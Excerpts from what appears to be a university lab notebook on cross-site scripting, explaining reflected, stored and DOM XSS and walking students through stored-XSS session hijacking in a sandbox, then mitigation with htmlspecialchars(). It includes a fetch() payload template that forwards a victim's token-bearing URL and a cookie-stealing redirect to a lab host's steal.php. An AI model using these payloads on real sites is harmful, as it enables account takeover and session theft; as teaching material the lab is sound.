    "# <strong>Cross-Site Scripting (XSS)</strong>\n",
    "\n",
    "Cross-Site Scripting (XSS) is an injection attack where hackers deliver a JavaScript payload to execute malicious code whenever someone visits a website. These types of attacks are common on websites that have message boards or comments. There are three types of XSS attacks.\n",
    "\n",
    "<figure><center><img src=\"resources/xss/xss_example.jpg\" style=\"width: 75%; height: 75%;\"></img></center><em><figcaption>Credit: <a href=\"https://spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/\">Spanning</a></figcaption></em></figure>\n",
    "\n",
    "<strong>Reflected XSS</strong> is where JavaScript is injected through an HTTP request. A website that uses CGI (Common Gateway Interface) retrieves parameters through the address bar of a browser. A reflected XSS attack injects HTML or JavaScript into an HTTP request, then tampers with the page that gets rendered to you.\n",
    "\n",
    "Here is an example from <a href=\"https://portswigger.net/web-security/cross-site-scripting\">PortSwigger</a>: \n",
    "\n",
    "```https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>```\n",
    "\n",
    "When the site is accessed, it will render: ```<p>Status: <script>/* Bad stuff here... */</script></p>```\n",
    "\n",
    "The ```<script>``` tag will execute any JavaScript code that the hacker wishes to write.\n",
    "\n",
    "<strong>Stored XSS</strong> is an attack where injected JavaScript is stored on a website by an attacker. For this lab, you will be working with stored XSS payloads. When message boards don't sanitize a user's input, a hacker can write an attack containing ```<script>```, which gets executed whenever that webpage is visited by anyone.\n",
    "\n",
    "<strong>DOM-Based XSS</strong> is an attack similar to reflected XSS attacks, but does not utilize HTTP requests when delivering the payload. Rather than using CGI parameters, a DOM-Based attack does not send data to the server, and the attack is entirely client-side. These attacks are difficult to differentiate from reflected XSS attacks. \n",
    "\n",
    "<strong>This lab will contain four topics, and you will learn the following:</strong>\n",

    "2. Session Hijacking\n",

    "\n",
    "An HTTP (Hypertext Transfer Protocol) request is a method of sending information across website pages. We are going to look at ```POST``` and ```GET``` requests for this lab.\n",
    "\n",
    "A <strong>```POST```</strong> request consists of sending data to a website, to which it becomes processed by the server. ```POST``` should not be confused with ```PUT```, where ```PUT``` is mainly used for replacing or updating a certain resource on a server. ```PUT``` requires a specific Uniform Resource Identifier (URI), meaning you must specify the exact path and resource that you want to update.\n",
    "\n",
    "The most common use of a ```POST``` request is submitting a form on a website. The website identifies specific names for each field, like name, email, or an \"accept\" checkbox. Then, when the user ```POST```s the information by clicking submit, the server assigns those names with specific values that the user provided on the form, then processes the information, like adding the values to the database.\n",
    "\n",
    "A <strong>```GET```</strong> request gathers a resource from a server. ```GET``` variables are easy to determine from a PHP website, as they appear in the URL of a website. A ```GET``` variable can be obtained by observing a ```?``` after a ```.php``` extension in the URL, then each subsequent name with a ```=``` is the name and value of each ```GET``` variable.\n",
    "\n",
    "Here is an example: ```https://www.testwebsite.com/index.php?name=umdsecXX&age=21```, where ```name``` is umdsecXX and ```age``` is 21.\n",
    "\n",
    "If you have ```telnet``` installed, you can call a ```GET``` request for the landing page of any website. Simply type ```telnet url 443``` to call an HTTPS request for any provided URL, then type ```GET /``` to get the HTML source code for the landing page of the website.\n",

    "Now, you are successfully able to post content on someone else's account by injecting JavaScript as a note on the website. At the moment, your attack is not stealing data from users.\n",
    "\n",
    "From the previous step, you have a working payload that allows you to post whatever you want onto someone else's account. Now, whenever ```Hacker``` accesses their website, you want to deliver a ```POST``` request that sends their URL value to your OWN account. Their URL contains their authentication token, allowing you to sign-in as ```Hacker```.\n",
    "\n",
    "With some careful thought, this is the outline that you plan to use:\n",
    "- Write a ```fetch``` request that writes a note onto ```Hacker```'s account. <u>You know how to do this already from Step 3.</u>\n",
    "- ```Hacker``` opens the page and executes infected JavaScript code that you wrote to their account.\n",
    "- The infected JavaScript code retrieves the current URL of ```Hacker```'s account, which contains their cookie.\n",
    "- Your payload takes ```Hacker```'s URL, then POSTs it as a note to your account.\n",
    "\n",
    "<strong>Your task</strong>: Create a payload that will send a note containing infected JavaScript to ```Hacker```'s account. The infected JavaScript will take the current URL of their profile, then send it back as a note to your own profile.\n",
    "\n",
    "This step is going to require some creative thinking. A template will be provided to you, then broken down to help demonstrate how it works.\n",
    "\n",
    "```\n",
    "<script>\n",
    "  fetch(\"xss_practice.php\", {\n",
    "    method: \"POST\",\n",
    "    headers: {\n",
    "      \"Content-Type\": \"application/x-www-form-urlencoded\"\n",
    "    },\n",
    "    body: 'username=EnterUserHere&note=' + encodeURIComponent(`<script>\n",
    "             Insert your payload here\n",
    "           <\\/script>`)\n",
    "  });\n",
    "</script>\n",
    "```\n",
    "\n",
    "This ```fetch``` function works mostly the same as before. However, there are some important instructions to understand with this template:\n",
    "- Special characters inside of a POST request, such as ```, / ? : @ & = + $ #``` can break the data that's being sent. When you wrap your payload with ```encodeURIComponent```, these characters will be safely escaped.\n",
    "- You will need to wrap quotes around your ```<script>``` tags, since ```encodeURIComponent``` takes a string for an argument. Instead of quotes, you may also backticks (``` ` ```), like the template uses. That way, you do not need to worry about escaping single/double quotes.\n",
    "- When nesting ```<script>``` tags within each other, the first occurrence of a ```</script>``` will close off the outer-most ```<script>``` tag. To prevent this, use ```<\\/script>``` when closing off the inner ```<script>``` tag.\n",
    "\n",
    "Some additional tips are given below for when you construct your payload.\n",
    "\n",
    "<span style=\"color: green\"><strong><img src=\"resources/idea.png\" style=\"width: 12px\"> Tips:</strong></span>\n",
    "\n",
    "- Like before, open the Console of your browser and attempt to type a ```fetch()``` request that will post a note to the victim's account. Use the ```Peek``` button to view any payloads/notes that ```Hacker``` will execute/read when they sign in. Once you have a working payload, you can use this for the body of a note within another ```fetch``` request.\n",
    "- ```location.href``` returns the URL of the current page where the JavaScript is executing. Use this to get the URL of ```Hacker```'s account.\n",
    "- Including a URL within a ```POST``` request can cause undefined behavior, since they likely contain unsafe characters that can break your HTTP request. When handling the URL of ```Hacker```'s website, use ```encodeURIComponent``` on the URL to safely escape those characters within the body of your victim's ```POST``` statement."

    "\n",
    "#### <strong>PHP Sessions</strong>\n",
    "\n",
    "PHP is a server-side language that's used in web development. PHP is responsible for back-end development, which consists of handling SQL queries for databases, transactions for businesses, image editing, saving data to a storage container, and much more. For this lab, we are focusing on some important concepts used for handling user information, which are sessions and cookies. \n",
    "\n",
    "<strong>Sessions</strong> are stored on a server, which expire when the browser is closed. Sessions are usually safer, and store content for less time. However, they do not make you invulnerable, which you will discover later in the lab.\n",
    "\n",
    "<strong>Cookies</strong> are stored on the client's browser, which have a set expiration time. Cookies are stored as text files, which the browser retrieves when a website requests them. You may look up where your cookies are stored by your browser, as well as their contents. A hacker can retrieve cookies no different from how you retrieve them. \n",
    "\n",
    "<em>Side note:</em> The European Union requires websites to be GDPR compliant if they use cookies, which is one of the most strict privacy and security laws in the world. If you are interested in reading more about cookies and the GDPR regulation, you may read more <a href=\"https://gdpr.eu/cookies/\">here</a>. \n",
    "\n",
    "It should be clear that cookies are not meant to store private data. The safer alternative to cookies are sessions. Cookies can still be used for storing data that's meant to be public.\n",
    "\n",
    "Sessions and cookies are global variables that are used in PHP, meaning they're usable across all PHP files in a server. However, a PHP file must \"activate\" a session variable by using ```session_start()```. They are called with either ```$_SESSION[\"key\"] = value;``` or ```$_COOKIE[\"key\"] = value;```. Before sessions can be used in PHP, a session must be started. Whenever a ```$_SESSION``` variable is used in PHP, you must call ```session_start()``` before the ```$_SESSION``` variable can be used. Sessions can be manually ended by using ```session_destroy()```.\n",
    "\n",
    "#### <strong>```document.cookie```</strong>\n",
    "\n",
    "The ```document.cookie``` variable is a <strong>JavaScript</strong> variable. JavaScript is a language that's used in browsers, which means that you can debug websites that use JavaScript straight from your browser. Each browser is different, but the general way that you can navigate to a console is by doing:\n",
    "\n",
    "- Right-click on a webpage (does not work in all webpages, like JupyterLab).\n",
    "- Navigate to \"Inspect Element\" or \"Inspect\".\n",
    "- Select \"Console\".\n",
    "\n",
    "Since ```document.cookie``` is a variable, you may simply type ```document.cookie``` within the console to view the value of it.\n",
    "\n",
    "Whenever PHP sets a session variable, the user is assigned a value called ```PHPSESSID```. Although session variables are stored on the server, the session ID must be stored on the browser, typically as a cookie named ```PHPSESSID```. When a request is made to the server, it uses this session ID to identify the corresponding session, retrieve the variables associated with it, and make them available for that specific user. These session variables cannot be accessed by anyone else unless they have your session ID."

    "<u>Here is the ultimate goal of the following few steps:</u> You are going to write a payload script that ```client``` will access whenever you click \"Check Payload\". Since ```steal.php``` is a web file that's stored on ```/var/www/html``` on ```teshwan```'s node, you will need to write a payload that will redirect ```client``` to ```http://10.0.1.3/steal.php?cookie=COOKIE_VALUE```.\n",

    "<strong>Why will a POST request not work?</strong> Secure websites use CORS, which stand for \"Cross-Origin Resource Sharing\". CORS is a security feature built into a browser that will prevent images, videos, files, and more. CORS prevents random websites from using your API to intiate POST requests without being on your website. This means making POST requests to other domains (or IP addresses, in this case) are blocked. The reason why a POST request worked in the first section is because all POST requests were made within the same domain of the website. Since there are three different IP addresses, with an infected payload running on a different IP from the ```server```, CORS will prevent ```client``` from calling something on ```teshwan```'s IP address."

    "\n",
    "From the previous few steps, you should be able to observe that creating an effective sanitization function is difficult, and should be avoided. Fortunately, PHP contains a built-in function that is used for escaping dangerous characters, named ```htmlspecialchars()```. This function takes a string for an input, and replaces all unsafe characters with escape characters to prevent cross-site scripting attacks. \n",
    "\n",
    "You may read the ```htmlspecialchars()``` documentation <a href=\"https://www.php.net/manual/en/function.htmlspecialchars.php\">here</a>.\n",
    "\n",
    "Open ```/var/www/html/sanitize.php``` in a text editor as ```sudo```, and go to the bottom of the file. You should view a function that looks like this:\n",

    "/**\n",
    "function sanitize($string) {\n",
    "\n",
    "}\n",
    "*/\n",
    "/*************************/\n",
    "```\n",
    "\n",
    "This function is currently commented out. You may leave it either commented or uncommented. The \"Check Payload\" button at the bottom will automatically uncomment it if you forgot to do it yourself. After uncommenting, it should appear as this:\n",
    "\n",
    "```\n",
    "/*** Your Routine Here ***/\n",
    "function sanitize($string) {\n",
    "\n",
    "}\n",
    "/*************************/\n",
    "```\n",
    "\n",
    "Create a sanitization function using ```htmlspecialchars()```. Then, using a payload that you previously used from Steps 7-9, test out your payload, then click \"Check Payload\". The admin will access every page on the forum. If the Eagles category doesn't get created, then you pass the step.\n",
    "\n",
